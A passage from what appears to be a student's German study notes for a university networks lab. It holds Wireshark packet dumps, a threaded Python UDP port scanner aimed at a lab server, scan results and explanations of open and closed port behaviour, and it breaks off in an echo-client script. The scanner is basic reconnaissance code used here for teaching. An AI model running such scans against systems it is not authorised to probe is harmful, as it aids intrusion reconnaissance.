[PSH, ACK] Seq=1 Ack=1 Win=262144 Len=162\n190 16.419683   141.37.200.3    141.37.168.26   TCP 54  32665 \u2192 17 [RST, ACK] Seq=2 Ack=163 Win=0 Len=0\n191 16.419823   141.37.168.26   141.37.200.3    TCP 60  17 \u2192 32665 [FIN, ACK] Seq=163 Ack=1 Win=262144 Len=0\n192 16.419848   141.37.200.3    141.37.168.26   TCP 54  32665 \u2192 17 [RST] Seq=1 Win=0 Len=0\n193 16.420559   141.37.168.26   141.37.200.3    Chargen 1434    Chargen\n194 16.420612   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST, ACK] Seq=2 Ack=1381 Win=0 Len=0\n195 16.420758   141.37.168.26   141.37.200.3    Chargen 1434    Chargen\n196 16.420809   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n197 16.421233   141.37.168.26   141.37.200.3    TCP 1434    [TCP Spurious Retransmission] 19 \u2192 32667 [ACK] Seq=2761 Ack=1 Win=262144 Len=1380\n198 16.421268   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n199 16.421488   141.37.168.26   141.37.200.3    Chargen 1434    [TCP Spurious Retransmission] Chargen\n200 16.421531   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n201 16.421676   141.37.168.26   141.37.200.3    TCP 1434    [TCP Spurious Retransmission] 19 \u2192 32667 [ACK] Seq=5521 Ack=1 Win=262144 Len=1380\n202 16.421699   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n203 16.421728   141.37.168.26   141.37.200.3    Chargen 110 [TCP Spurious Retransmission] Chargen\n204 16.421765   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n205 16.421861   141.37.168.26   141.37.200.3    TCP 1434    [TCP Spurious Retransmission] 19 \u2192 32667 [ACK] Seq=6957 Ack=1 Win=262144 Len=1380\n206 16.421890   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n207 16.422118   141.37.168.26   141.37.200.3    Chargen 1434    [TCP Spurious Retransmission] Chargen\n208 16.422141   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n209 16.422330   141.37.168.26   141.37.200.3    TCP 1434    [TCP Spurious Retransmission] 19 \u2192 32667 [ACK] Seq=9717 Ack=1 Win=262144 Len=1380\n210 16.422353   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n211 16.422382   141.37.168.26   141.37.200.3    Chargen 1434    [TCP Spurious Retransmission] Chargen\n212 16.422402   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=1 Win=0 Len=0\n213 16.440389   141.37.168.26   141.37.200.3    TCP 60  17 \u2192 32665 [ACK] Seq=164 Ack=2 Win=262144 Len=0\n214 16.440427   141.37.200.3    141.37.168.26   TCP 54  32665 \u2192 17 [RST] Seq=2 Win=0 Len=0\n215 16.440792   141.37.168.26   141.37.200.3    TCP 60  19 \u2192 32667 [ACK] Seq=12477 Ack=2 Win=262144 Len=0\n216 16.440817   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [RST] Seq=2 Win=0 Len=0\n217 16.886811   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32664 \u2192 16 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n218 16.886811   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32672 \u2192 24 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n219 16.886811   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32656 \u2192 8 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n220 16.886811   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32649 \u2192 3 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n221 16.886875   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32658 \u2192 10 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n222 16.886875   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32666 \u2192 18 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n223 16.886879   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32651 \u2192 1 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n224 16.886884   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32674 \u2192 26 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n225 16.886918   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32660 \u2192 12 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n226 16.886918   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32650 \u2192 2 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n227 16.886918   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32668 \u2192 20 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n228 16.886957   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32675 \u2192 27 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n229 16.886966   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32652 \u2192 4 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n230 16.886976   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32659 \u2192 11 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n231 16.886976   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32669 \u2192 21 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n232 16.887012   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32653 \u2192 5 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n233 16.887034   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32662 \u2192 14 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n234 16.887034   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32670 \u2192 22 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n235 16.887035   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32676 \u2192 28 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n236 16.887039   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32654 \u2192 6 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n237 16.887091   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32663 \u2192 15 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n238 16.887091   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32671 \u2192 23 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n239 16.887131   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32677 \u2192 29 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n240 16.887195   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32681 \u2192 25 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=4 SACK_PERM\n241 16.887221   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32678 \u2192 30 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n242 16.887316   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32679 \u2192 31 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n243 16.902779   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32684 \u2192 35 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n244 16.902779   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32688 \u2192 39 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n245 16.902779   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32689 \u2192 40 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n246 16.902782   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32682 \u2192 33 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n247 16.902782   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32680 \u2192 32 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n248 16.902823   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32696 \u2192 47 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n249 16.902831   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32683 \u2192 34 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n250 16.902831   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32692 \u2192 43 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n251 16.902832   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32691 \u2192 42 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n252 16.902832   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32697 \u2192 48 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n253 16.902875   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32690 \u2192 41 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n254 16.902875   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32698 \u2192 49 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n255 16.902889   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32685 \u2192 36 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n256 16.902899   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32699 \u2192 50 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n257 16.902929   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32686 \u2192 37 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n258 16.902934   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32693 \u2192 44 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n259 16.902974   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32687 \u2192 38 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n260 16.902983   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32695 \u2192 46 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n261 16.903029   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32694 \u2192 45 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n262 16.924143   141.37.168.26   141.37.200.3    TCP 60  3 \u2192 32649 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n263 16.924204   141.37.168.26   141.37.200.3    TCP 60  10 \u2192 32658 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n264 16.924241   141.37.168.26   141.37.200.3    TCP 60  18 \u2192 32666 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n265 16.924278   141.37.168.26   141.37.200.3    TCP 60  24 \u2192 32672 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n266 16.924312   141.37.168.26   141.37.200.3    TCP 60  8 \u2192 32656 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n267 16.924345   141.37.168.26   141.37.200.3    TCP 60  16 \u2192 32664 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n268 16.924379   141.37.168.26   141.37.200.3    TCP 60  1 \u2192 32651 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n269 16.924543   141.37.168.26   141.37.200.3    TCP 60  26 \u2192 32674 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n270 16.924581   141.37.168.26   141.37.200.3    TCP 60  20 \u2192 32668 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n271 16.924613   141.37.168.26   141.37.200.3    TCP 60  12 \u2192 32660 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n272 16.924646   141.37.168.26   141.37.200.3    TCP 60  2 \u2192 32650 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n273 16.924709   141.37.168.26   141.37.200.3    TCP 60  4 \u2192 32652 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n274 16.924764   141.37.168.26   141.37.200.3    TCP 60  11 \u2192 32659 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n275 16.924816   141.37.168.26   141.37.200.3    TCP 60  27 \u2192 32675 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n276 16.924858   141.37.168.26   141.37.200.3    TCP 60  5 \u2192 32653 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n277 16.924998   141.37.168.26   141.37.200.3    TCP 60  21 \u2192 32669 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n278 16.925033   141.37.168.26   141.37.200.3    TCP 60  14 \u2192 32662 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n279 16.925458   141.37.168.26   141.37.200.3    TCP 60  28 \u2192 32676 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n280 16.925493   141.37.168.26   141.37.200.3    TCP 60  22 \u2192 32670 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n281 16.925525   141.37.168.26   141.37.200.3    TCP 60  6 \u2192 32654 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n282 16.925557   141.37.168.26   141.37.200.3    TCP 60  15 \u2192 32663 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n283 16.925708   141.37.168.26   141.37.200.3    TCP 60  23 \u2192 32671 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n284 16.925763   141.37.168.26   141.37.200.3    TCP 60  30 \u2192 32678 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n285 16.925815   141.37.168.26   141.37.200.3    TCP 60  29 \u2192 32677 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n286 16.925928   141.37.168.26   141.37.200.3    TCP 60  25 \u2192 32681 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n287 16.925963   141.37.168.26   141.37.200.3    TCP 60  31 \u2192 32679 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n288 16.939388   141.37.168.26   141.37.200.3    TCP 60  39 \u2192 32688 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n289 16.939494   141.37.168.26   141.37.200.3    TCP 60  40 \u2192 32689 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n290 16.939542   141.37.168.26   141.37.200.3    TCP 60  35 \u2192 32684 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n291 16.939590   141.37.168.26   141.37.200.3    TCP 60  33 \u2192 32682 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n292 16.939624   141.37.168.26   141.37.200.3    TCP 60  32 \u2192 32680 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n293 16.939849   141.37.168.26   141.37.200.3    TCP 60  47 \u2192 32696 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n294 16.939891   141.37.168.26   141.37.200.3    TCP 60  34 \u2192 32683 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n295 16.939935   141.37.168.26   141.37.200.3    TCP 60  43 \u2192 32692 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n296 16.939979   141.37.168.26   141.37.200.3    TCP 60  48 \u2192 32697 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n297 16.940011   141.37.168.26   141.37.200.3    TCP 60  42 \u2192 32691 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n298 16.940478   141.37.168.26   141.37.200.3    TCP 60  49 \u2192 32698 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n299 16.940519   141.37.168.26   141.37.200.3    TCP 60  36 \u2192 32685 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n300 16.940669   141.37.168.26   141.37.200.3    TCP 60  41 \u2192 32690 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n301 16.940740   141.37.168.26   141.37.200.3    TCP 60  44 \u2192 32693 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n302 16.940921   141.37.168.26   141.37.200.3    TCP 60  50 \u2192 32699 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n303 16.940974   141.37.168.26   141.37.200.3    TCP 60  38 \u2192 32687 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n304 16.941008   141.37.168.26   141.37.200.3    TCP 60  37 \u2192 32686 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n305 16.941156   141.37.168.26   141.37.200.3    TCP 60  46 \u2192 32695 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n306 16.941197   141.37.168.26   141.37.200.3    TCP 60  45 \u2192 32694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n314 17.432086   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32681 \u2192 25 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=4 SACK_PERM\n315 17.469178   141.37.168.26   141.37.200.3    TCP 60  25 \u2192 32681 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n316 17.973806   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32681 \u2192 25 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=4 SACK_PERM\n317 18.010670   141.37.168.26   141.37.200.3    TCP 60  25 \u2192 32681 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n338 18.516437   141.37.200.3    141.37.168.26   TCP 66  [TCP Port numbers reused] 32681 \u2192 25 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=4 SACK_PERM\n339 18.553187   141.37.168.26   141.37.200.3    TCP 60  25 \u2192 32681 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n</code></pre> <pre><code>import socket\nimport threading\n\nTARGET_HOST = \"141.37.168.26\"   # Zielhost (HTWG Laborserver)\nPORT_RANGE = range(1, 51)       # Ports 1-50\nTIMEOUT = 1.0                   # Sekunden\nContinue = True                 # Globales Flag\n\noffene_ports = []\nkeine_antwort = []\nfehlerhafte_ports = []\n\ndef scan_udp(port):\n    global Continue\n    if not Continue:\n        return\n\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(TIMEOUT)\n        message = b\"Testnachricht\"\n        sock.sendto(message, (TARGET_HOST, port))\n\n        try:\n            data, addr = sock.recvfrom(1024)\n            print(f\"[ANTWORT] UDP-Port {port} antwortet \u2192 evtl. OFFEN\")\n            offene_ports.append(port)\n        except socket.timeout:\n            print(f\"[TIMEOUT] UDP-Port {port} keine Antwort\")\n            keine_antwort.append(port)\n        except socket.error as e:\n            if e.errno == 10054:\n                print(f\"[FEHLER 10054] UDP-Port {port} Ziel nicht erreichbar\")\n                fehlerhafte_ports.append(port)\n            else:\n                print(f\"[FEHLER] UDP-Port {port} Fehler: {e}\")\n\n        sock.close()\n\n    except Exception as e:\n        print(f\"[FEHLER] Port {port} Setup fehlgeschlagen: {e}\")\n\n# Threads starten\nthreads = []\nfor port in PORT_RANGE:\n    t = threading.Thread(target=scan_udp, args=(port,))\n    t.start()\n    threads.append(t)\n\n# Auf alle Threads warten\nfor t in threads:\n    t.join()\n\n# Zusammenfassung\nprint(\"\\n[FERTIG]\")\nprint(\"Antwort erhalten (m\u00f6glicherweise offen):\", offene_ports)\nprint(\"Keine Antwort (unbekannt):\", keine_antwort)\nprint(\"ICMP Fehler 10054 (geschlossen):\", fehlerhafte_ports)\n</code></pre> \ud83e\uddfe UDP Dump anzeigen <pre><code>3447    654.888145  141.37.200.3    141.37.168.26   UDP 55  50862 \u2192 1 Len=13\n3448    654.894577  141.37.200.3    141.37.168.26   UDP 55  50863 \u2192 2 Len=13\n3449    654.894762  141.37.200.3    141.37.168.26   UDP 55  50864 \u2192 3 Len=13\n3450    654.895177  141.37.200.3    141.37.168.26   UDP 55  50865 \u2192 4 Len=13\n3451    654.895359  141.37.200.3    141.37.168.26   UDP 55  50866 \u2192 5 Len=13\n3452    654.895562  141.37.200.3    141.37.168.26   UDP 55  50867 \u2192 6 Len=13\n3453    654.895713  141.37.200.3    141.37.168.26   ECHO    55  Request\n3454    654.895896  141.37.200.3    141.37.168.26   UDP 55  50869 \u2192 8 Len=13\n3455    654.896053  141.37.200.3    141.37.168.26   DISCARD 55  Discard\n3456    654.896225  141.37.200.3    141.37.168.26   UDP 55  50871 \u2192 10 Len=13\n3457    654.896396  141.37.200.3    141.37.168.26   UDP 55  50872 \u2192 11 Len=13\n3458    654.896549  141.37.200.3    141.37.168.26   UDP 55  50873 \u2192 12 Len=13\n3459    654.897052  141.37.200.3    141.37.168.26   DAYTIME 55  DAYTIME Request\n3460    654.897193  141.37.200.3    141.37.168.26   UDP 55  50875 \u2192 14 Len=13\n3461    654.897358  141.37.200.3    141.37.168.26   UDP 55  50876 \u2192 15 Len=13\n3462    654.897530  141.37.200.3    141.37.168.26   UDP 55  50877 \u2192 16 Len=13\n3463    654.897694  141.37.200.3    141.37.168.26   UDP 55  50878 \u2192 17 Len=13\n3464    654.897829  141.37.200.3    141.37.168.26   UDP 55  50879 \u2192 18 Len=13\n3465    654.897946  141.37.200.3    141.37.168.26   Chargen 55  Chargen\n3466    654.898084  141.37.200.3    141.37.168.26   UDP 55  50881 \u2192 20 Len=13\n3467    654.898322  141.37.200.3    141.37.168.26   UDP 55  50882 \u2192 21 Len=13\n3468    654.898405  141.37.200.3    141.37.168.26   UDP 55  50883 \u2192 22 Len=13\n3469    654.898525  141.37.200.3    141.37.168.26   UDP 55  50884 \u2192 23 Len=13\n3470    654.898682  141.37.200.3    141.37.168.26   UDP 55  50885 \u2192 24 Len=13\n3471    654.898808  141.37.200.3    141.37.168.26   UDP 55  50886 \u2192 25 Len=13\n3472    654.898966  141.37.200.3    141.37.168.26   UDP 55  50887 \u2192 26 Len=13\n3473    654.899069  141.37.200.3    141.37.168.26   UDP 55  50888 \u2192 27 Len=13\n3474    654.899247  141.37.200.3    141.37.168.26   UDP 55  50889 \u2192 28 Len=13\n3475    654.899362  141.37.200.3    141.37.168.26   UDP 55  50890 \u2192 29 Len=13\n3476    654.899510  141.37.200.3    141.37.168.26   UDP 55  50891 \u2192 30 Len=13\n3477    654.899616  141.37.200.3    141.37.168.26   UDP 55  50892 \u2192 31 Len=13\n3478    654.899764  141.37.200.3    141.37.168.26   UDP 55  50893 \u2192 32 Len=13\n3479    654.899903  141.37.200.3    141.37.168.26   UDP 55  50894 \u2192 33 Len=13\n3480    654.900038  141.37.200.3    141.37.168.26   UDP 55  50895 \u2192 34 Len=13\n3481    654.900182  141.37.200.3    141.37.168.26   UDP 55  50896 \u2192 35 Len=13\n3482    654.900374  141.37.200.3    141.37.168.26   UDP 55  50897 \u2192 36 Len=13\n3483    654.900680  141.37.200.3    141.37.168.26   UDP 55  50899 \u2192 38 Len=13\n3484    654.900700  141.37.200.3    141.37.168.26   TIME    55  TIME Request\n3485    654.901152  141.37.200.3    141.37.168.26   UDP 55  50900 \u2192 39 Len=13\n3486    654.901353  141.37.200.3    141.37.168.26   UDP 55  50901 \u2192 40 Len=13\n3487    654.902074  141.37.200.3    141.37.168.26   UDP 55  50902 \u2192 41 Len=13\n3488    654.902212  141.37.200.3    141.37.168.26   UDP 55  50903 \u2192 42 Len=13\n3489    654.902424  141.37.200.3    141.37.168.26   UDP 55  50904 \u2192 43 Len=13\n3490    654.902557  141.37.200.3    141.37.168.26   UDP 55  50905 \u2192 44 Len=13\n3491    654.902781  141.37.200.3    141.37.168.26   UDP 55  50906 \u2192 45 Len=13\n3492    654.902845  141.37.200.3    141.37.168.26   UDP 55  50907 \u2192 46 Len=13\n3493    654.903270  141.37.200.3    141.37.168.26   UDP 55  50908 \u2192 47 Len=13\n3494    654.903323  141.37.200.3    141.37.168.26   UDP 55  50909 \u2192 48 Len=13\n3495    654.903447  141.37.200.3    141.37.168.26   XTACACS 55  Unknown (0x65)[Malformed Packet]\n3496    654.903570  141.37.200.3    141.37.168.26   UDP 55  50911 \u2192 50 Len=13\n3497    654.925008  141.37.168.26   141.37.200.3    ICMP    83  Destination unreachable (Port unreachable)\n3498    654.932534  141.37.168.26   141.37.200.3    ECHO    60  Response\n3499    654.933379  141.37.168.26   141.37.200.3    DAYTIME 63  DAYTIME Response\n3500    654.934516  141.37.168.26   141.37.200.3    UDP 208 17 \u2192 50878 Len=166\n3501    654.935454  141.37.168.26   141.37.200.3    IPv4    685 Fragmented IP protocol (proto=UDP 17, off=5920, ID=853f)\n</code></pre>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-1_1","title":"Frage 1:","text":"<p>Geben Sie die Liste der offenen TCP und UDP Ports an.</p> <p>\u2705 Antwort: TCP: </p><pre><code>[INFO] Starte TCP-Portscan auf 141.37.168.26...\n[OFFEN] TCP-Port 25\n[OFFEN] TCP-Port 7\n[OFFEN] TCP-Port 9\n[OFFEN] TCP-Port 13\n[OFFEN] TCP-Port 17\n[OFFEN] TCP-Port 19\n\n[FERTIG] Offene TCP-Ports: [25, 7, 9, 13, 17, 19]\n</code></pre><p></p> <p>UDP:(Scans mit unterschiedlichem Ergebnis)</p> <pre><code>Antwort erhalten (m\u00f6glicherweise offen): [7, 13, 17, 19]\nKeine Antwort (unbekannt): [10, 15, 16, 9, 6, 20, 4, 5, 22, 2, 8, 21, 18, 12, 11, 3, 23, 14, 24, 39, 27, 37, 38, 41, 30, 26, 25, 28, 50, 36, 29, 31, 40, 48, 32, 35, 47, 43, 45, 34, 33, 42, 46, 49, 44]\nICMP Fehler 10054 (geschlossen): [1]\n</code></pre>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-2_1","title":"Frage 2:","text":"<p>W\u00e4hlen Sie f\u00fcr TCP und UDP jeweils einen offenen und einen geschlossenen Port und erkl\u00e4ren Sie die entsprechende Paketsequenz, die Sie in WireShark aufgezeichnet haben</p> <p>\u2705 Antwort:</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#tcp","title":"TCP","text":"<ul> <li> <p>Offen: Port 13 (DAYTIME)</p> <ul> <li>Client sendet <code>SYN</code></li> <li>Server antwortet mit <code>SYN-ACK</code></li> <li>Client sendet <code>ACK</code> \u2192 Verbindung ist aufgebaut</li> <li>Server sendet DAYTIME-Antwort (z.\u202fB. aktuelle Uhrzeit)</li> <li>Danach erfolgt Verbindungsabbau (<code>FIN</code>, <code>ACK</code>, etc.)</li> </ul> </li> <li> <p>Geschlossen: Port 1</p> <ul> <li>Client sendet <code>SYN</code></li> <li>Server antwortet mit <code>RST, ACK</code> \u2192 Verbindung wird abgelehnt</li> <li>Port ist geschlossen, keine Anwendung lauscht dort</li> </ul> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#udp","title":"UDP","text":"<ul> <li> <p>Offen: Port 7 (ECHO)</p> <ul> <li>Client sendet UDP-Paket</li> <li>Server antwortet mit exakt demselben Payload (<code>ECHO Response</code>)</li> <li>\u2192 Port ist offen und aktiv</li> </ul> </li> <li> <p>Geschlossen: Port 1</p> <ul> <li>Client sendet UDP-Paket an Port 1</li> <li>Server antwortet mit <code>ICMP Destination unreachable (Port unreachable)</code></li> <li>\u2192 Port ist geschlossen</li> </ul> </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-3_1","title":"Frage 3:","text":"<p>Auf Port 7 des Servers l\u00e4uft ein ECHO-Dienst. Testen Sie ihr Client-Script mit dem ECHOServer. Versuchen Sie das TCP und das UDP Script</p> <p>\u2705 Antwort:</p> Echo-Test TCPEcho-Test UDP <p></p><pre><code># echo_tcp_client.py\nimport socket\nimport time\n\nServer_IP = '141.37.168.26'\nServer_PORT = 7\nMESSAGE = 'Hello, World!'\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(10)\n\nprint('Connecting to TCP server with IP', Server_IP, 'on Port', Server_PORT)\nsock.connect((Server_IP, Server_PORT))\nprint('Sending message:', 